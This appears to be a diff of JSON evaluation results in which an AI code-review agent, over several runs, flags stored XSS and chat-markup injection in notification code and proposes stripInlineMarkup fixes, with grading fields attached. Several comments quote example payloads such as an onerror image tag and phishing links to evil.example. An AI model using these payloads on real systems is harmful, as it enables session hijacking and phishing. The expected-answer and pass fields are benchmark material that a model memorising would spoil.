+          "claim": "WHAT: mentionInbox interpolates raw m.authorName and m.body into `html` without stripInlineMarkup. WHY: clients.ts:11 documents this html as 'rendered as is in the web app's notification inbox', so a comment body containing `<img src=x onerror=...>` or `<a href=\"https://evil.example\">Reset password</a>` executes/renders in the recipient's session — stored XSS. HOW: wrap both values: `<strong>${stripInlineMarkup(m.authorName)}</strong> mentioned you: ${stripInlineMarkup(m.body)}`.",
+          "keep": true,
+          "rationale": "Confirmed: mentions.ts:26-31 interpolates raw m.authorName and m.body into html, and clients.ts:11 documents that html is \"rendered as is in the web app's notification inbox\" — an unescaped stored XSS sink. The sibling mentionEmail at lines 15-16 already wraps both values in stripInlineMarkup, confirming the intended pattern. Note: PreviousDecision index 1 addressed mentionEmail (a DIFFERENT sink/operation); the inbox sink here was not covered, so this is not a repeat of that entry.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/mentions.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/clients.ts",
+                "startLine": 1,
+                "endLine": 30
+              },
+              "failed": false
+            }
+          ]
+        },
+        {
+          "file": "src/notifications/mentions.ts",
+          "claim": "WHAT: mentionChat interpolates raw m.authorName and m.body into the chat `text` without stripInlineMarkup, and clients.ts:6 documents that `text` renders chat markup where `<url|label>` becomes a link and `<!channel>` pings everyone. WHY: a comment body containing `<!channel>` notifies the entire channel and `<https://evil.example|Reset password>` renders an attacker-controlled live link inside our chat, i.e. chat-markup injection and a phishing vector. HOW: wrap both fields in stripInlineMarkup as mentionEmail already does.",
+          "keep": true,
+          "rationale": "The code at mentions.ts:22 interpolates raw m.authorName and m.body into the chat `text` field with no stripInlineMarkup, while mentionEmail (line 15-16) does strip. clients.ts:6 confirms `text` renders chat markup where `<url|label>` becomes a live link and `<!channel>` pings everyone, so the injection vector is real. The previous decision (index 1) applied to mentionEmail specifically — a different sink with a different failure mode (email phishing link); the chat-channel ping/markup injection in mentionChat is a separate operation, not the same problem re-raised, so it is not resolved by that entry.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/mentions.ts",
+                "startLine": 1,
+                "endLine": 40
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/clients.ts",
+                "startLine": 1,
+                "endLine": 30
+              },
+              "failed": false
+            }
+          ]
+        },
+        {
+          "file": "src/notifications/mentions.ts",
+          "claim": "WHAT: mentionChat interpolates raw m.authorName and m.body into chat markup text without stripInlineMarkup. WHY: per clients.ts:6 and the sanitize.ts header, `<url|label>` renders a live link and `<!channel>` pings everyone, so a comment body like `<https://evil.example|Reset password>` or `<!channel>` produces a phishing link or an @everyone ping from our bot in a customer channel. HOW: wrap both values: `${stripInlineMarkup(m.authorName)} mentioned you: ${stripInlineMarkup(m.body)}\\n<${m.threadUrl}|Open the thread>`.",
+          "keep": true,
+          "rationale": "Confirmed: mentionChat at src/notifications/mentions.ts:20-24 interpolates raw m.authorName and m.body into chat markup, unlike mentionEmail (lines 12-18) which wraps both in stripInlineMarkup. sanitize.ts:1-6 documents that user text may carry chat markup such as <!channel> and <https://evil.example|Reset password> links, and states every outbound sink should pass user text through stripInlineMarkup. The omission is a real, concrete injection path producing a phishing link / @channel ping from the bot. The previous decision only covered mentionEmail (a different sink), so this is a distinct operation, not a repeat.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/mentions.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/sanitize.ts"
+              },
+              "failed": false
+            }
+          ]
+        },
+        {
+          "file": "src/notifications/mentions.ts",
+          "claim": "WHAT: mentionInbox interpolates raw m.authorName and m.body into the `html` field, and clients.ts:11-12 documents that this html is rendered as-is in the web app's notification inbox. WHY: raw user-controlled comment text rendered as-is is stored XSS in the inbox, letting an attacker run script in the victim's session. HOW: pass both fields through stripInlineMarkup before building the html.",
+          "keep": true,
+          "rationale": "Confirmed: mentionInbox (src/notifications/mentions.ts:26-31) interpolates raw m.authorName and m.body into the `html` field with no sanitization, while sibling mentionEmail (lines 15-16) passes both through stripInlineMarkup. clients.ts:11 explicitly documents that this html is rendered as-is in the web app's notification inbox, so raw user-controlled comment text becomes stored XSS. sanitize.ts:3 states \"Every outbound sink passes user text through stripInlineMarkup first,\" confirming the intended invariant is violated here. PreviousDecision index 1 concerns a different function/sink (email), so this is the same class of bug in a separate operation, not a repeat.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/mentions.ts",
+                "startLine": 1,
+                "endLine": 40
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "html|innerHTML|dangerouslySetInnerHTML",
+                "path": "src/notifications/clients.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "stripInlineMarkup",
+                "path": "src/notifications"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "endLine": 20,
+                "path": "src/notifications/sanitize.ts",
+                "startLine": 1
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 12,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 4,
+        "after": 4
+      },
+      "delivered": [
+        {
+          "sourceIndex": 0,
+          "severity": "high",
+          "linkedById": false,
+          "label": "security",
+          "marked": false,
+          "file": "src/notifications/mentions.ts",
+          "line": 20,
+          "text": "Per `clients.ts:6` and the `sanitize.ts` header, `<url|label>` renders a live link and `<!channel>` pings everyone, so because `mentionChat` interpolates raw `m.authorName` and `m.body` into chat markup, a body like `<https://evil.example|Reset password>` or `<!channel>` can produce a phishing link or an @everyone ping from our bot in a customer channel. Wrap both values with `stripInlineMarkup` as `${stripInlineMarkup(m.authorName)} mentioned you: ${stripInlineMarkup(m.body)}\\n<${m.threadUrl}|Open the thread>`."
+        },
+        {
+          "sourceIndex": 1,
+          "severity": "critical",
+          "linkedById": false,
+          "label": "security",
+          "marked": false,
+          "file": "src/notifications/mentions.ts",
+          "line": 26,
+          "text": "`clients.ts:11` documents this `html` as rendered as-is in the web app's notification inbox, so because `mentionInbox` interpolates raw `m.authorName` and `m.body`, a body containing `<img src=x onerror=...>` or `<a href=\"https://evil.example\">Reset password</a>` is stored XSS in the recipient's session. Wrap both values with `stripInlineMarkup` as `<strong>${stripInlineMarkup(m.authorName)}</strong> mentioned you: ${stripInlineMarkup(m.body)}`."
+        },
+        {
+          "sourceIndex": 2,
+          "severity": "high",
+          "linkedById": false,
+          "label": "security",
+          "marked": false,
+          "file": "src/notifications/mentions.ts",
+          "line": 20,
+          "text": "Per `clients.ts:6`, chat `text` renders `<url|label>` as a link and `<!channel>` as a channel-wide ping, so because `mentionChat` interpolates raw `m.authorName` and `m.body`, a comment body with `<!channel>` or `<https://evil.example|Reset password>` can ping the entire channel or inject an attacker-controlled phishing link. Wrap both fields in `stripInlineMarkup` as `mentionEmail` already does."
+        },
+        {
+          "sourceIndex": 3,
+          "severity": "critical",
+          "linkedById": false,
+          "label": "security",
+          "marked": false,
+          "file": "src/notifications/mentions.ts",
+          "line": 26,
+          "text": "`clients.ts:11-12` documents this `html` as rendered as-is in the web app's notification inbox, so because `mentionInbox` interpolates raw `m.authorName` and `m.body`, user-controlled comment text becomes stored XSS that can run script in the victim's session. Pass both fields through `stripInlineMarkup` before building the `html`."
+        }
+      ],
+      "claims": [
+        {
+          "id": "chat-inbox-markup-new-site",
+          "expect": "deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": true,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": "high",
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 4,
+      "case": "P37-markup-strip-new-sinks",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 70150,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/notifications/mentions.ts",
+          "claim": "WHAT: mentionInbox interpolates the user-controlled m.authorName and m.body raw into the `html` field that InboxStore.add renders as-is (clients.ts:10-12). WHY: a comment containing `<img src=x onerror=...>` executes as stored XSS in the web notification inbox for the recipient, and the stated sanitize.ts:1-3 sink contract is violated (mentionEmail was fixed, this new sink was not). HOW: wrap both values with stripInlineMarkup: `<strong>${stripInlineMarkup(m.authorName)}</strong> mentioned you: ${stripInlineMarkup(m.body)}`.",
+          "keep": true,
+          "rationale": "Confirmed. src/notifications/mentions.ts:28 builds `html` by raw interpolation of user-controlled m.authorName and m.body, and clients.ts:10-12 documents that InboxStore.add renders `html` as-is in the web notification inbox. sanitize.ts:1-3 explicitly states every outbound sink must pass user text through stripInlineMarkup; mentionEmail (line 15-16) was fixed but mentionInbox was not. This is a concrete stored-XSS path distinct from the earlier email-sink decision (a separate operation/sink), so it is not a repeat of PreviousDecision index 1.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/mentions.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/clients.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/sanitize.ts"
+              },
+              "failed": false
+            }
+          ]
+        },
+        {
+          "file": "src/notifications/mentions.ts",
+          "claim": "WHAT: mentionChat interpolates the user-controlled m.authorName and m.body straight into the chat message text, which ChatClient.post renders as chat markup. WHY: a comment body such as `<https://evil.example|Reset password>` renders as a live attacker link in a message sent by our bot, and `<!channel>` pings the entire channel — the exact sink contract sanitize.ts:1-3 says must be sanitized (same class already fixed for mentionEmail). HOW: wrap both values with stripInlineMarkup: `${stripInlineMarkup(m.authorName)} mentioned you: ${stripInlineMarkup(m.body)}\\n<${m.threadUrl}|Open the thread>`.",
+          "keep": true,
+          "rationale": "Confirmed. src/notifications/mentions.ts:22 interpolates m.authorName and m.body raw into chat text. sanitize.ts:1-3 explicitly documents the contract that user text (including `<https://evil.example|...>` links and `<!channel>` mentions) must pass through stripInlineMarkup before any outbound sink. mentionEmail (line 12-18) already applies it; mentionChat does not. This is a different sink (chat markup) than the email sink addressed by PreviousDecision index 1, so it is not a repeat. The root cause and failure path are factually correct; no guard exists upstream in this function.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/mentions.ts",
+                "startLine": 1,
+                "endLine": 40
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/sanitize.ts",
+                "startLine": 1,
+                "endLine": 40
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 11,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 2,
+        "after": 2
+      },
+      "delivered": [
+        {
+          "sourceIndex": 0,
+          "severity": "high",
+          "linkedById": false,
+          "label": "security",
+          "marked": false,
+          "file": "src/notifications/mentions.ts",
+          "line": 22,
+          "text": "Because `mentionChat` interpolates user-controlled `m.authorName` and `m.body` directly into chat markup rendered by `ChatClient.post`, a body such as `<https://evil.example|Reset password>` becomes a live attacker link and `<!channel>` pings the entire channel, violating the `sanitize.ts:1-3` sink contract already applied to `mentionEmail`. Wrap both values with `stripInlineMarkup` as in `${stripInlineMarkup(m.authorName)} mentioned you: ${stripInlineMarkup(m.body)}\\n<${m.threadUrl}|Open the thread>`."
+        },
+        {
+          "sourceIndex": 1,
+          "severity": "critical",
+          "linkedById": false,
+          "label": "security",
+          "marked": false,
+          "file": "src/notifications/mentions.ts",
+          "line": 28,
+          "text": "Because `mentionInbox` interpolates user-controlled `m.authorName` and `m.body` raw into the `html` field rendered as-is by `InboxStore.add` (clients.ts:10-12), a comment containing `<img src=x onerror=...>` executes as stored XSS in the recipient's web notification inbox, violating the `sanitize.ts:1-3` sink contract already applied to `mentionEmail`. Wrap both values with `stripInlineMarkup` as in `<strong>${stripInlineMarkup(m.authorName)}</strong> mentioned you: ${stripInlineMarkup(m.body)}`."
+        }
+      ],
+      "claims": [
+        {
+          "id": "chat-inbox-markup-new-site",
+          "expect": "deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": true,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": "high",
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 5,
+      "case": "P37-markup-strip-new-sinks",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 78200,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/notifications/mentions.ts",
+          "claim": "WHAT: mentionChat interpolates m.authorName and m.body into chat text without sanitization, while the sibling mentionEmail and the sanitize.ts contract require every outbound sink to pass user text through stripInlineMarkup. WHY: ChatClient.post documents that `text` renders chat markup, so a comment containing `<https://evil.example|Reset password>` renders as a live link in a message sent from our bot and `<!channel>` pings the whole channel — a ready phishing/abuse vector. HOW: wrap both values, e.g. `${stripInlineMarkup(m.authorName)} mentioned you: ${stripInlineMarkup(m.body)}`.",
+          "keep": true,
+          "rationale": "Confirmed: mentionChat (src/notifications/mentions.ts:22) interpolates m.authorName and m.body directly into chat text, while the sibling mentionEmail (lines 15-16) passes both through stripInlineMarkup. sanitize.ts's own contract states 'Every outbound sink passes user text through stripInlineMarkup first', and ChatClient.post's doc (clients.ts:6) explicitly warns `text` uses chat markup (<url|label> renders a link, <!channel> pings everyone). So a comment body like `<https://evil.example|Reset password>` or `<!channel>` renders as a live link/ping from our bot — a real phishing/abuse vector. This is a DIFFERENT sink than the earlier decision (round-a-P37-markup-strip-new-sinks), which only addressed mentionEmail's subject/HTML; that decision resolved only the email sink, not this chat sink. Not refuted.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/mentions.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/sanitize.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "post\\(|renders chat markup|ChatClient",
+                "path": "src/notifications/clients.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/clients.ts"
+              },
+              "failed": false
+            }
+          ]
+        },
+        {
+          "file": "src/notifications/mentions.ts",
+          "claim": "WHAT: mentionInbox writes m.authorName and m.body raw into the inbox item's html, but InboxStore.add documents that `html` is rendered as-is in the web app. WHY: a comment body containing HTML/script is stored and rendered verbatim, giving a stored XSS in the notification inbox — the sibling mentionEmail sanitizes the same inputs and sanitize.ts states every sink must. HOW: apply stripInlineMarkup to both values, e.g. html: `<strong>${stripInlineMarkup(m.authorName)}</strong> mentioned you: ${stripInlineMarkup(m.body)}`.",
+          "keep": true,
+          "rationale": "Confirmed: src/notifications/mentions.ts:28 writes m.authorName and m.body raw into the inbox item's html, while clients.ts:11 documents that `html` is rendered as-is in the web app's notification inbox. This is a genuine stored XSS sink, and sanitize.ts:3 states every outbound sink must pass user text through stripInlineMarkup — the sibling mentionEmail (line 16) does. The earlier PreviousDecision (round-a-P37) only covered mentionEmail's email subject/body; mentionInbox is a separate sink and a different operation, so this is not a repeat.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/mentions.ts",
+                "startLine": 1,
+                "endLine": 40
+              },
+              "failed": false
+            },
+            {
+              "name": "findFile",
+              "args": {
+                "pattern": "InboxStore*"
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "InboxStore|rendered as-is|add\\(",
+                "path": "src/notifications"
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "stripInlineMarkup|every sink",
+                "path": "src/notifications/sanitize.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/clients.ts",
+                "startLine": 1,
+                "endLine": 30
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/sanitize.ts",
+                "startLine": 1,
+                "endLine": 20
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 19,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 2,
+        "after": 2
+      },
+      "delivered": [
+        {
+          "sourceIndex": 0,
+          "severity": "high",
+          "linkedById": false,
+          "label": "security",
+          "marked": false,
+          "file": "src/notifications/mentions.ts",
+          "line": 20,
+          "text": "`ChatClient.post` renders `text` as chat markup, so a comment containing `<https://evil.example|Reset password>` becomes a live link in a message sent from our bot and `<!channel>` pings the whole channel — a ready phishing and abuse vector. Wrap both `m.authorName` and `m.body` in `stripInlineMarkup`, matching the sibling `mentionEmail` and the `sanitize.ts` contract that every outbound sink sanitizes user text."
+        },
+        {
+          "sourceIndex": 1,
+          "severity": "critical",
+          "linkedById": false,
+          "label": "security",
+          "marked": false,
+          "file": "src/notifications/mentions.ts",
+          "line": 26,
+          "text": "`InboxStore.add` documents that `html` is rendered as-is in the web app, so a comment body containing HTML or script is stored and rendered verbatim, giving a stored XSS in the notification inbox. Apply `stripInlineMarkup` to both `m.authorName` and `m.body`, the same way `mentionEmail` sanitizes the identical inputs."
+        }
+      ],
+      "claims": [
+        {
+          "id": "chat-inbox-markup-new-site",
+          "expect": "deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": true,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": "high",
+          "pass": true
+        }
+      ]
+    }
+  ]
+}
